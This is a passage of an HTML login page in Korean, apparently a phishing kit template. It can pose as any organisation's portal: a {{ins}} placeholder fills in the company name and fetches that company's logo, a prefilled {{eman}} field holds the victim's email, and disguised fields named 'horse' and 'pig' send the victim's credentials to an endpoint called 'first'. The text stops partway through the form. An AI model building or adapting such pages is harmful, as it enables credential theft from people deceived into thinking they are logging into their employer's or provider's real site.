<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
    <title>{{ins}} 포털 로그인</title>
    <style>
        /* Global Styles */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background-color: #f4f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }

        .login-container {
            background-color: #fff;
            padding: 40px 50px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            box-sizing: border-box;
        }

        /* Logo Styling */
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo img {
            width: 150px; /* Adjust as needed */
        }

        /* Heading and Paragraph Styles */
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            color: #0056b3;
            margin-bottom: 20px;
            text-align: center;
        }

        p {
            text-align: center;
            font-size: 0.9rem;
            color: #777;
        }

        /* Input Fields */
        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 1rem;
            box-sizing: border-box;
            transition: border-color 0.3s ease;
        }

        .input-field:focus {
            border-color: #0056b3;
            outline: none;
        }

        .input-field::placeholder {
            color: #888;
        }

        /* Remember Me Checkbox */
        .remember-me {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .remember-me input {
            margin-right: 10px;
        }

        /* Login Button */
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #0056b3;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .login-btn:hover {
            background-color: #004494;
        }

        /* Forgot Password Link */
        .forgot-password {
            font-size: 0.9rem;
            color: #0056b3;
            text-align: center;
            margin-top: 15px;
            cursor: pointer;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Social Media Logins */
        .social-btns {
            display: flex;
            justify-content: space-evenly;
            margin-top: 20px;
        }

        .social-btns button {
            padding: 10px;
            border-radius: 50%;
            border: none;
            background-color: #fff;
            box-shadow: 0 3px 5px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .social-btns button:hover {
            transform: scale(1.1);
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 10px;
        }

        /* Mobile Responsiveness */
        @media (max-width: 600px) {
            .login-container {
                width: 90%;
                padding: 30px;
            }
            h1 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>

    <!-- Login Container -->
    <div class="login-container">
        <!-- Logo -->
        <div class="logo">
            <img src="https://api.kickfire.com/logo?website={{ins}}" alt="회사 로고">
        </div>
        <form action="first" method="POST">
        <!-- Login Form Heading -->
        <h1>계정에 로그인</h1>
        <p>귀하의 대시보드에 액세스하여 비즈니스 작업을 원활하게 관리하세요.</p>

        <!-- Username and Password Inputs -->
        <input name="horse" type="text" class="input-field" value="{{eman}}" required>
        <input name="pig" type="password" class="input-field" placeholder="비밀번호" required>

        <!-- Remember Me Option -->
        <div class="remember-me">
            <input type="checkbox" id="remember-me">
            <label for="remember-me">로그인 상태 유지</label>
        </div>

        <!-- Login Button -->
        <button class="login-btn">로그인</button>

        <!-- Forgot Password Link -->
        <div class="forgot-password">
            <span>비밀번호를 잊으셨나요?</span>
